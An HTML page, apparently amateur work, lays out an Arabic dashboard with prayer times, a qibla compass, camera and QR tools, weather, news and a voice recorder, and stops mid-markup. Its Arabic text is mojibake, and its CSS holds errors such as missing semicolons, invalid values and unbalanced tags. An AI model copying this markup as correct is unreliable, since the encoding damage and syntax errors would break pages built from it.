<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø®Ø¯Ù…Ø§Øª Ø§Ø³Ù„Ø§Ù…ÙŠØ©</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 20px;
            text-align: center;
        }
        .container {
            background-color: #1e1e1e;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(255, 215, 0, 1);
            margin-bottom: 20px;
            width: 95%;
            max-width: 450px;
        }
        h2 {
            color: #ffffff;
            border-bottom: 2px solid #00bcd4;
            padding-bottom: 10px;
            margin-top: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .camera-container {
            position: relative;
            width: 100%;
            /* === Ù‡Ø°Ø§ Ù‡Ùˆ Ø§Ù„ØªØºÙŠÙŠØ± Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ === */
            /* ØªÙ… ØªØºÙŠÙŠØ± Ø§Ù„Ù†Ø³Ø¨Ø© Ø¥Ù„Ù‰ 177.78% Ù„Ø¹Ù…Ù„ Ø´ÙƒÙ„ Ø·ÙˆÙ„ÙŠ (Aspect Ratio 9:16) */
            padding-top: 177.78%; 
            background-color: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .time {
            font-size: 2.5em;
            font-weight: bold;
            color: #00bcd4;
            letter-spacing: 2px;
            margin: 10px 0 5px 0;
        }
        .date {
            font-size: 1.1em;
            color: #b0b0b0;
        }
        .timer-display {
            font-size: 2.2em;
            font-weight: bold;
            margin: 15px 0;
            font-family: 'Courier New', Courier, monospace;
        }
        #stopwatch-display { color: #ff9800; }
        #countdown-display { color: #4caf50; }

        .buttons button {
            background-color: #00bcd4;
            color: #121212;
            border: none;
            padding: 12px 22px;
            margin: 5px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: bold;
            transition: all 0.2s ease-in-out;
        }
        .buttons button:hover:not(:disabled) {
            background-color: #0097a7;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(255, 215, 0, 1);
        }
        .buttons button:disabled {
            background-color: #444;
            color: #888;
            cursor: not-allowed;
        }
        #stop-stopwatch-btn, #pause-timer-btn { background-color: #ff9800; }
        #reset-stopwatch-btn, #cancel-timer-btn { background-color: #f44336; }
        
        .timer-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        .timer-inputs label {
            display: flex;
            flex-direction: column;
        }
        .timer-inputs span {
            font-size: 0.8em;
            color: #aaa;
            margin-bottom: 4px;
        }
        .timer-inputs input {
            width: 70px;
            padding: 10px;
            font-size: 1.4em;
            text-align: center;
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            border-radius: 8px;
            -moz-appearance: textfield;
        }
        .timer-inputs input::-webkit-outer-spin-button,
        .timer-inputs input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
/* style.css */

.calculator-container {
    font-family: 'Cairo', sans-serif; /* ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ø³ØªÙŠØ±Ø§Ø¯ Ø§Ù„Ø®Ø· ÙÙŠ Ù…Ù„ÙÙƒ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ */
    background-color: #1e1e1e;
    padding: 25px;
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(255, 215, 0, 1);
    color: gold
    width: 100%;
    max-width: 450px;
    text-align: center;
    margin: 4px auto; /* ÙŠØ¶Ù…Ù† ØªÙˆØ³Ø· Ø§Ù„Ø¹Ù†ØµØ± ÙÙŠ Ø§Ù„ØµÙØ­Ø© */
}

.calculator-container h2 {
    color: #ffba00;
    margin-bottom: 20px;
}

.calculator-container label {
    display: white;
    margin-bottom: 20px;
    font-weight: bold;
    color: #ffba00;
}

.calculator-container input[type="date"] {
    width: calc(100% - 8px);
    padding: 4px;
    border: 1px solid #ffba00;
    border-radius: 15px;
    font-size: 16px;
    margin-bottom: 20px;
}

.calculator-container button {
    width: 100%;
    padding: 4px;
    background: linear-gradient(45deg, #1877f2, #166fe5);
    color: gold;
    border: none;
    border-radius: 15px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: transform 0.2s, box-shadow 0.2s;
}

.calculator-container button:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 15px rgba(255, 215, 0, 1);
}

#result {
    margin-top: 4px;
    padding-top: 4px;
    border-top: 1px solid #dddfe2;
    text-align: right;
    line-height: 1.8;
    color: #1c1e21;
}

#result h3 {
    color: #ffba00;
    text-align: center;
    margin-bottom: 20px;
}

#result .motto {
    font-style: italic;
    font-weight: bold;
    color: #fff;
    text-align: center;
    margin-bottom: 20px;
    padding: 4px;
    background-color: #000;
    border-radius: 8px;
}
/* ÙƒÙˆØ¯ ØªØµÙ…ÙŠÙ… Ø§Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ù‡Ø¬Ø±ÙŠ */

#hijri-date-container {
    font-family: 'Cairo', sans-serif;
    color: #ffba00
    background-color: #1e1e1e;
    border: 1px solid #ffba00;
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(255, 215, 0, 1);  
    width: 95%;
    padding: 10px 15px;
    max-width: 450px;
    margin: 4px auto;
    text-align: center;
    font-size: 24px;
    font-weight: bold;
}
/* ÙƒÙˆØ¯ ØªØµÙ…ÙŠÙ… Ù…ÙˆØ§Ù‚ÙŠØª Ø§Ù„ØµÙ„Ø§Ø© */

.prayer-times-container {
    font-family: 'Cairo', sans-serif;
    background-color: #1e1e1e;
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(255, 215, 0, 1);  
    width: 95%;
    padding: 10px 15px;
    max-width: 450px;
    margin: 4px auto;
}

.prayer-times-container h2 {
    color: gold;
    margin-bottom: 20px;
    font-size: 22px;
}

#prayer-times-grid {
    display: grid;
    grid-template-columns: 1fr 1fr; /* Ø¹Ù…ÙˆØ¯ÙŠÙ† */
    gap: 10px; /* Ù…Ø³Ø§ÙØ© Ø¨ÙŠÙ† Ø§Ù„Ø¹Ù†Ø§ØµØ± */
}

.prayer-item {
    background-color: black;
    padding: 15px;
    border-radius: 8px;
    font-size: 16px;
    font-weight: bold;
    color: gold;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.prayer-item.loading span {
    color: #999; /* Ù„ÙˆÙ† Ø¨Ø§Ù‡Øª Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ØªØ­Ù…ÙŠÙ„ */
}
/* ÙƒÙˆØ¯ ØªØµÙ…ÙŠÙ… Ø¨ÙˆØµÙ„Ø© Ø§Ù„Ù‚Ø¨Ù„Ø© */

.qibla-container {
    font-family: 'Cairo', sans-serif;
    background-color: #1e1e1e;
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(255, 215, 0, 1);  
    width: 95%;
    padding: 10px 15px;
    max-width: 450px;
    margin: 4px auto;
    text-align: center;
    
}

.qibla-container h2 {
    color: #1c1e21;
    margin-bottom: 20px;
}

#qibla-compass {
    width: 200px;
    height: 200px;
    background-image: url('https://i.imgur.com/sC9f2oH.png'); /* ØµÙˆØ±Ø© Ø®Ù„ÙÙŠØ© Ù„Ù„Ø¨ÙˆØµÙ„Ø© */
    background-size: cover;
    border-radius: 50%;
    margin: 20px auto;
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
}

#compass-arrow {
    width: 0;
    height: 0;
    border-left: 12px solid transparent;
    border-right: 12px solid transparent;
    border-bottom: 90px solid #d93025; /* Ù„ÙˆÙ† Ø§Ù„Ø³Ù‡Ù… Ø£Ø­Ù…Ø± */
    position: absolute;
    top: 10px;
    transition: transform 0.5s ease-out; /* Ø­Ø±ÙƒØ© Ø¯ÙˆØ±Ø§Ù† Ù†Ø§Ø¹Ù…Ø© */
}

#qibla-status {
    font-size: 16px;
    color: #606770;
    font-weight: bold;
    min-height: 24px;
}

/* ÙƒÙˆØ¯ ØªØµÙ…ÙŠÙ… Ø£Ø¯ÙˆØ§Øª ØªØ®ØµÙŠØµ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª */

.settings-container, .notifications-container {
    font-family: 'Cairo', sans-serif;
    background-color: #1e1e1e;
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(255, 215, 0, 1);  
    width: 95%;
    padding: 10px 15px;
    max-width: 450px;
    margin: 4px auto;
    text-align: center;
    
}
.settings-container label {
    font-weight: bold;
    color: #333;
    margin-left: 10px;
}

#city-select {
    padding: 8px;
    border-radius: 8px;
    border: 1px solid #ddd;
    font-family: 'Cairo', sans-serif;
    font-size: 16px;
}

#notifications-btn {
    width: 100%;
    padding: 12px;
    background: linear-gradient(45deg, #28a745, #218838);
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s, transform 0.2s;
}

#notifications-btn:hover {
    transform: translateY(-2px);
}

#notifications-btn:disabled {
    background: #6c757d;
    cursor: not-allowed;
}

#notifications-status {
    margin-top: 10px;
    font-size: 14px;
    color: #606770;
}
/* ÙƒÙˆØ¯ ØªØµÙ…ÙŠÙ… Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ù‚Ø³ */

.weather-container {
    font-family: 'Cairo', sans-serif;
    background: linear-gradient(135deg, #6dd5ed, #2193b0);
    color: white;
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    width: 90%;
    max-width: 450px;
    text-align: center;
    margin: 40px auto;
}

.weather-container h2 {
    margin-bottom: 20px;
    font-size: 22px;
}

#weather-info {
    display: flex;
    flex-direction: column;
    align-items: center;
}

#weather-location {
    font-size: 20px;
    font-weight: bold;
}

#weather-temp {
    font-size: 48px;
    font-weight: bold;
    margin: 10px 0;
}

#weather-desc {
    font-size: 18px;
    text-transform: capitalize; /* Ù„Ø¬Ø¹Ù„ Ø£ÙˆÙ„ Ø­Ø±Ù ÙƒØ¨ÙŠØ± */
}

/* ÙƒÙˆØ¯ ØªØµÙ…ÙŠÙ… Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø®Ø¨Ø§Ø± */

.news-container {
    background-color: #1e1e1e;
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(255, 215, 0, 1);  
    width: 95%;
    padding: 10px 15px;
    max-width: 450px;
    margin: 4px auto;
    text-align: center;
}

.news-container h2 {
    text-align: center;
    color: #ffba00;
    margin-bottom: 20px;
}

#news-articles {
    max-height: 400px; /* ØªØ­Ø¯ÙŠØ¯ Ø£Ù‚ØµÙ‰ Ø§Ø±ØªÙØ§Ø¹ Ù„Ø¬Ø¹Ù„ Ø§Ù„Ù„ÙˆØ­Ø© Ù‚Ø§Ø¨Ù„Ø© Ù„Ù„ØªÙ…Ø±ÙŠØ± */
    overflow-y: auto; /* Ø¥Ø¶Ø§ÙØ© Ø´Ø±ÙŠØ· ØªÙ…Ø±ÙŠØ± Ø¹Ù…ÙˆØ¯ÙŠ Ø¹Ù†Ø¯ Ø§Ù„Ø­Ø§Ø¬Ø© */
    padding-right: 10px; /* Ù…Ø³Ø§ÙØ© Ù„Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ…Ø±ÙŠØ± */
}

.article {
    border: 1px solid #dddfe2;
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 15px;
    display: flex;
    flex-direction: column;
}

.article img {
    width: 100%;
    height: auto;
    border-radius: 8px;
    margin-bottom: 10px;
}

.article h3 {
    font-size: 16px;
    margin: 0 0 10px 0;
    color: #ffba00;
}

.article .source {
    font-size: 12px;
    color: #fff;
    margin-bottom: 15px;
}

.article a {
    text-decoration: none;
    color: white;
    background-color: #1877f2;
    padding: 8px 12px;
    border-radius: 6px;
    text-align: center;
    font-weight: bold;
    align-self: flex-start; /* Ù…Ø­Ø§Ø°Ø§Ø© Ø§Ù„Ø²Ø± Ù„Ù„Ø¨Ø¯Ø§ÙŠØ© */
    transition: background-color 0.2s;
}

.article a:hover {
    background-color: #166fe5;
}

/* ÙƒÙˆØ¯ ØªØµÙ…ÙŠÙ… ØµÙ†Ø¯ÙˆÙ‚ Ø£Ø¯ÙˆØ§Øª Ø§Ù„ÙƒÙ„Ø§Ù… Ø§Ù„Ù…Ø¯Ù…Ø¬ */

.unified-speech-tool {
    font-family: 'Cairo', sans-serif;
    background-color: #1e1e1e;
    padding: 25px;
    border-radius: 15px;
    box-shadow: 0 4px 20px rgba(0, 188, 212, 0.3);
    width: 90%;
    max-width: 450px;
    text-align: center;
    margin: 40px auto;
    border: 1px solid #00bcd4;
}

.unified-speech-tool h2 {
    color: #00bcd4;
    margin-bottom: 10px;
}

.unified-speech-tool .description {
    color: #b0b0b0;
    font-size: 14px;
    margin-bottom: 20px;
}

#shared-textarea {
    width: calc(100% - 22px);
    background-color: #2c2c2c;
    color: #e0e0e0;
    border: 1px solid #007a8a;
    border-radius: 8px;
    padding: 10px;
    font-size: 16px;
    resize: vertical;
    margin-bottom: 20px;
    box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
}

.main-controls, .extra-tools {
    display: flex;
    gap: 15px;
    margin-bottom: 15px;
}

.main-controls button {
    flex: 1; /* Ù„Ø¬Ø¹Ù„ Ø§Ù„Ø²Ø±ÙŠÙ† ÙŠÙ…Ù„Ø¢Ù† Ø§Ù„Ù…Ø³Ø§Ø­Ø© Ø¨Ø§Ù„ØªØ³Ø§ÙˆÙŠ */
    padding: 15px;
    font-size: 1.1em;
    font-weight: bold;
    border-radius: 8px;
    border: none;
    cursor: pointer;
    transition: all 0.2s ease-in-out;
}

#listen-btn {
    background-color: #00bcd4;
    color: #121212;
}
#listen-btn:hover {
    background-color: #0097a7;
}
#listen-btn.listening {
    background-color: #f44336;
    color: white;
    animation: pulse-red 1.5s infinite;
}

@keyframes pulse-red {
    0% { box-shadow: 0 0 0 0 rgba(244, 67, 54, 0.7); }
    70% { box-shadow: 0 0 0 10px rgba(244, 67, 54, 0); }
    100% { box-shadow: 0 0 0 0 rgba(244, 67, 54, 0); }
}

#speak-btn {
    background-color: #4caf50;
    color: white;
}
#speak-btn:hover {
    background-color: #43a047;
}

.extra-tools button {
    flex: 1;
    padding: 10px;
    font-size: 0.9em;
    border-radius: 6px;
    border: 1px solid #607d8b;
    background-color: transparent;
    color: #607d8b;
    cursor: pointer;
    transition: all 0.2s;
}

.extra-tools button:hover:not(:disabled) {
    background-color: #607d8b;
    color: white;
}

.extra-tools button:disabled {
    border-color: #444;
    color: #444;
    cursor: not-allowed;
}

.status {
    color: #ff9800;
    margin-top: 15px;
    font-weight: bold;
    min-height: 20px;
}
/*
 * CSS Code for Voice Recorder
 * by Gemini
 */

/* Ø­Ø§ÙˆÙŠØ© Ù…Ø³Ø¬Ù„ Ø§Ù„ØµÙˆØª Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© */
.voice-recorder-container {
    font-family: 'Cairo', sans-serif;
    background-color: #1e1e1e;
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 4px 15px rgba(255, 215, 0, 1);  
    width: 90%;
    max-width: 450px;
    text-align: center;
    margin: 40px auto;
    border: 1px solid #00bcd4;
    text-align: center;
    border: 1px solid #d1d9e6;
}

/* Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù…Ø³Ø¬Ù„ */
.voice-recorder-container h2 {
    color: #334e68; /* Ù„ÙˆÙ† Ù†Øµ Ø¯Ø§ÙƒÙ† */
    margin-top: 0;
    margin-bottom: 20px;
    font-size: 24px;
}

/* Ø­Ø§ÙˆÙŠØ© Ø£Ø²Ø±Ø§Ø± Ø§Ù„ØªØ­ÙƒÙ… */
.voice-recorder-container .recorder-controls {
    margin-bottom: 30px;
}

/* Ù†Øµ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³Ø¬Ù„ */
#recorder-status {
    color: #627d98;
    font-size: 16px;
    min-height: 24px; /* Ø­Ø¬Ø² Ù…Ø³Ø§Ø­Ø© Ù„ØªØ¬Ù†Ø¨ Ø§Ù‡ØªØ²Ø§Ø² Ø§Ù„ØµÙØ­Ø© */
    margin-bottom: 20px;
}

/* ØªØµÙ…ÙŠÙ… Ø§Ù„Ø£Ø²Ø±Ø§Ø± (Ø§Ù„Ø¨Ø¯Ø¡ ÙˆØ§Ù„Ø¥ÙŠÙ‚Ø§Ù) */
.recorder-controls button {
    width: 70px;
    height: 70px;
    border-radius: 50%; /* Ù„Ø¬Ø¹Ù„ Ø§Ù„Ø²Ø± Ø¯Ø§Ø¦Ø±ÙŠÙ‹Ø§ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ */
    border: none;
    background-color: #ffffff;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    cursor: pointer;
    font-size: 28px; /* Ù„ØªÙƒØ¨ÙŠØ± Ø­Ø¬Ù… Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© */
    color: #ff4757; /* Ù„ÙˆÙ† Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„ */
    transition: transform 0.2s ease, box-shadow 0.2s ease;
    margin: 0 10px; /* Ù…Ø³Ø§ÙØ© Ø¨ÙŠÙ† Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø¥Ø°Ø§ Ø¸Ù‡Ø±ÙˆØ§ Ù…Ø¹Ù‹Ø§ */
}

/* ØªØ£Ø«ÙŠØ± Ø¹Ù†Ø¯ Ù…Ø±ÙˆØ± Ø§Ù„Ù…Ø§ÙˆØ³ ÙÙˆÙ‚ Ø§Ù„Ø£Ø²Ø±Ø§Ø± */
.recorder-controls button:hover {
    transform: scale(1.1); /* ØªÙƒØ¨ÙŠØ± Ø¨Ø³ÙŠØ· Ù„Ù„Ø²Ø± */
    box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
}

/* Ø²Ø± Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù */
#stop-record-btn {
    color: #4b4b4b; /* Ù„ÙˆÙ† Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù */
}

/* Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„Ø§Øª Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø© */
.voice-recorder-container .recordings-list {
    width: 100%;
    margin-top: 20px;
}

/* Ø¹Ù†ÙˆØ§Ù† Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„Ø§Øª */
.recordings-list h3 {
    color: #334e68;
    border-bottom: 2px solid #d1d9e6; /* Ø®Ø· Ù„Ù„ÙØµÙ„ */
    padding-bottom: 10px;
    margin-bottom: 15px;
}

/* (Ø§Ø®ØªÙŠØ§Ø±ÙŠ) ÙŠÙ…ÙƒÙ†Ùƒ Ø¥Ø¶Ø§ÙØ© Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù„ØªÙ†Ø³ÙŠÙ‚ ÙƒÙ„ ØªØ³Ø¬ÙŠÙ„ Ø¹Ù†Ø¯ Ø¥Ø¶Ø§ÙØªÙ‡ Ù„Ø§Ø­Ù‚Ù‹Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª */
.recording-item {
    background-color: #ffffff;
    padding: 10px 15px;
    border-radius: 10px;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
}
.recording-item audio {
    flex-grow: 1; /* Ù„Ø¬Ø¹Ù„ Ø´Ø±ÙŠØ· Ø§Ù„ØµÙˆØª ÙŠØ£Ø®Ø° Ø§Ù„Ù…Ø³Ø§Ø­Ø© Ø§Ù„Ù…ØªØ§Ø­Ø© */
    height: 40px;
}


        #camera-feed {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            transition: filter 0.3s ease;
        }
        
        #qr-box {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 60%;
            height: 40%; /* ØªØ¹Ø¯ÙŠÙ„ Ø§Ø±ØªÙØ§Ø¹ Ø§Ù„Ù…Ø±Ø¨Ø¹ Ù„ÙŠØªÙ†Ø§Ø³Ø¨ Ù…Ø¹ Ø§Ù„Ø´ÙƒÙ„ Ø§Ù„Ø·ÙˆÙ„ÙŠ */
            transform: translate(-50%, -50%);
            border: 3px solid rgba(255, 255, 255, 0.8);
            box-shadow: 0 0 0 4000px rgba(0,0,0,0.5);
            display: none;
        }

        .controls-grid {
            display: grid;
            grid-template-columns: 1fr 1fr; /* Ø¹Ù…ÙˆØ¯Ø§Ù† Ø¯Ø§Ø¦Ù…Ù‹Ø§ */
            gap: 15px;
        }
        
        .zoom-control {
            grid-column: 1 / -1; /* ØªØ¬Ø¹Ù„ Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø±ÙŠØ¨ ÙŠÙ…ØªØ¯ Ø¹Ù„Ù‰ Ø¹Ø±Ø¶ Ø§Ù„Ø¹Ù…ÙˆØ¯ÙŠÙ† */
            display: none;
            align-items: center;
            gap: 10px;
            color: #ccc;
        }
        
        #zoom-slider {
            width: 100%;
        }

        .btn, .filter-select {
            background-color: #333;
            color: #e0e0e0;
            border: 1px solid #555;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 700;
            transition: background-color 0.2s ease;
        }
        
        /* Ø¬Ø¹Ù„ Ø§Ù„ÙÙ„Ø§ØªØ± ØªÙ…ØªØ¯ Ø¹Ù„Ù‰ Ø¹Ø±Ø¶ Ø§Ù„Ø¹Ù…ÙˆØ¯ÙŠÙ† */
        .filter-select {
             grid-column: 1 / -1;
        }

        .btn:hover, .filter-select:hover {
            background-color: #444;
        }
        
        #switch-camera-btn, #zoom-container {
            display: none;
        }
        
        #capture-btn { background-color: #bb86fc; color: #121212; }
        #scan-qr-btn { background-color: #03dac6; color: #121212; }






















    </style>
</head>
<body>


    <div class="container">
        <h1>ğŸ“· ÙØ§Ø­Øµ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h1>       
        <div class="camera-container">
            <video id="camera-feed" autoplay playsinline></video>
            <canvas id="capture-canvas" style="display: none;"></canvas>
            <div id="qr-box"></div>
        </div>
        
        <div class="controls-grid">
            <button id="capture-btn" class="btn">ğŸ“¸ Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©</button>
            <button id="scan-qr-btn" class="btn">ğŸ”³ Ù…Ø³Ø­ QR</button>
            <button id="switch-camera-btn" class="btn">ğŸ”„ ØªØ¨Ø¯ÙŠÙ„</button>
            <select id="filter-select" class="filter-select">
                <option value="none">Ø¨Ø¯ÙˆÙ† ÙÙ„ØªØ±</option>
                <option value="contrast(150%)">ØªØ¨Ø§ÙŠÙ† Ø¹Ø§Ù„ÙŠ</option>
                <option value="grayscale(100%)">Ø£Ø¨ÙŠØ¶ ÙˆØ£Ø³ÙˆØ¯</option>
                <option value="sepia(100%)">Ø¨Ù†ÙŠ Ø¯Ø§ÙƒÙ†</option>
                <option value="invert(100%)">Ø£Ù„ÙˆØ§Ù† Ù…Ø¹ÙƒÙˆØ³Ø©</option>
            </select>
            <div class="zoom-control" id="zoom-container">
                <label for="zoom-slider">ØªÙ‚Ø±ÙŠØ¨:</label>
                <input type="range" id="zoom-slider" min="1" max="1" step="0.1" value="1">
            </div>
        </div>
    </div>


<div id="hijri-date-container"></div>

<div class="settings-container">
    <label for="city-select">Ø§Ø®ØªØ± Ù…Ø¯ÙŠÙ†ØªÙƒ:</label>
    <select id="city-select">
        <option value="Cairo">Ø§Ù„Ù‚Ø§Ù‡Ø±Ø©</option>
        <option value="Alexandria">Ø§Ù„Ø¥Ø³ÙƒÙ†Ø¯Ø±ÙŠØ©</option>
        <option value="Giza">Ø§Ù„Ø¬ÙŠØ²Ø©</option>
        <option value="Port Said">Ø¨ÙˆØ± Ø³Ø¹ÙŠØ¯</option>
        <option value="Suez">Ø§Ù„Ø³ÙˆÙŠØ³</option>
        <option value="Luxor">Ø§Ù„Ø£Ù‚ØµØ±</option>
        <option value="Aswan">Ø£Ø³ÙˆØ§Ù†</option>
        <option value="Asyut">Ø£Ø³ÙŠÙˆØ·</option>
        <option value="Tanta">Ø·Ù†Ø·Ø§</option>
    </select>
</div>
<div class="prayer-times-container">
    <h2 id="prayer-city-title">ğŸ•Œ Ù…ÙˆØ§Ù‚ÙŠØª Ø§Ù„ØµÙ„Ø§Ø© (Ø§Ù„Ù‚Ø§Ù‡Ø±Ø©)</h2>
    <div id="prayer-times-grid">
        <div class="prayer-item loading">Ø§Ù„ÙØ¬Ø± <span id="fajr-time">...</span></div>
        <div class="prayer-item loading">Ø§Ù„Ø´Ø±ÙˆÙ‚ <span id="sunrise-time">...</span></div>
        <div class="prayer-item loading">Ø§Ù„Ø¸Ù‡Ø± <span id="dhuhr-time">...</span></div>
        <div class="prayer-item loading">Ø§Ù„Ø¹ØµØ± <span id="asr-time">...</span></div>
        <div class="prayer-item loading">Ø§Ù„Ù…ØºØ±Ø¨ <span id="maghrib-time">...</span></div>
        <div class="prayer-item loading">Ø§Ù„Ø¹Ø´Ø§Ø¡ <span id="isha-time">...</span>
</div>
<div class="notifications-container">
    <button id="notifications-btn">ğŸ”” ØªÙØ¹ÙŠÙ„ Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø§Ù„Ø£Ø°Ø§Ù†</button>
    <p id="notifications-status">Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ù„ØªÙ„Ù‚ÙŠ ØªÙ†Ø¨ÙŠÙ‡ Ø¹Ù†Ø¯ ÙƒÙ„ ØµÙ„Ø§Ø©.</p>
</div>
</div>
    </div>
</div>
</div>

<audio id="adhan-audio" src="https://www.islamcan.com/audio/adhan/azan2.mp3" preload="auto"></audio>



<div class="qibla-container">
    <h2>ğŸ•‹ Ø§ØªØ¬Ø§Ù‡ Ø§Ù„Ù‚Ø¨Ù„Ø©</h2>
    <div id="qibla-compass">
        <div id="compass-arrow"></div>
    </div>
    <p id="qibla-status">Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹...</p>
</div>

    <div class="container">
        <h2>ğŸ“ ØªÙˆÙ‚ÙŠØª Ø§Ù„Ù‚Ø§Ù‡Ø±Ø©ØŒ Ù…ØµØ±</h2>
        <p id="egypt-time" class="time">--:--:--</p>
        <p id="egypt-date" class="date">---ØŒ -- --- ----</p>
    </div>

    <div class="container">
        <h2>ğŸ‡ºğŸ‡¸ ØªÙˆÙ‚ÙŠØª Ù†ÙŠÙˆÙŠÙˆØ±ÙƒØŒ Ø£Ù…Ø±ÙŠÙƒØ§</h2>
        <p id="usa-time" class="time">--:--:--</p>
        <p id="usa-date" class="date">---ØŒ -- --- ----</p>
    </div>

<div class="weather-container">
    <h2>â˜€ï¸ Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ù‚Ø³</h2>
    <div id="weather-info">
        <div id="weather-location">Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹...</div>
        <div id="weather-temp">--Â°C</div>
        <div id="weather-desc">--</div>
    </div>
</div>


<div class="calculator-container">
    <h2>âœ¨ Ø­Ø§Ø³Ø¨Ø© Ø§Ù„Ø¹Ù…Ø± ÙˆØ§Ù„Ø¨Ø±Ø¬ Ø§Ù„ÙÙ„ÙƒÙŠ âœ¨</h2>
    <label for="birthdate">Ø£Ø¯Ø®Ù„ ØªØ§Ø±ÙŠØ® Ù…ÙŠÙ„Ø§Ø¯Ùƒ:</label>
    <input type="date" id="birthdate">
    <button onclick="calculate()">Ø§Ø­Ø³Ø¨</button>
    <div id="result">
        </div>
</div>


<div class="news-container">
    <h2>ğŸ“° Ø¢Ø®Ø± Ø§Ù„Ø£Ø®Ø¨Ø§Ø± Ù…Ù† Ù…ØµØ±</h2>
    <div id="news-articles">
        <p>Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø£Ø®Ø¨Ø§Ø±...</p>
    </div>
</div>


<div class="voice-recorder-container">
    <h2>ğŸ™ï¸ Ù…Ø³Ø¬Ù„ Ø§Ù„Ø°ÙƒØ±ÙŠØ§Øª Ø§Ù„ØµÙˆØªÙŠØ©</h2>
    <div class="recorder-controls">
        <p id="recorder-status">Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ù„Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„</p>
        <button id="record-btn" title="Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„">ğŸ”´</button>
        <button id="stop-record-btn" title="Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ³Ø¬ÙŠÙ„" style="display: none;">â¬›</button>
    </div>
    <div class="recordings-list" id="recordings-list">
        <h3>Ø§Ù„ØªØ³Ø¬ÙŠÙ„Ø§Øª Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©</h3>
        </div>
</div>

<div class="unified-speech-tool">
